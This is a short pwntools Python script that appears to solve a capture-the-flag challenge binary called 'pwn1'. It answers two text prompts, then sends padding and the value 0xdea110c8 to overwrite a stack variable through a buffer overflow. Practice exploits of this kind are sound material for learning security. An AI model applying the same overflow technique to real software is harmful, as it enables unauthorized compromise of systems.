#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./pwn1")

p = process("./pwn1")

# gdb.attach(p, gdbscript = "break *0x565558b2")



padding = b'a'*0x2b
payload = 0xdea110c8

exploit = padding + p32(payload)

p.recvline()
p.send(b"Sir Lancelot of Camelot\n")
p.recvline()
p.send(b"To seek the Holy Grail.\n")

p.recvline()
p.sendline(exploit)

p.interactive()
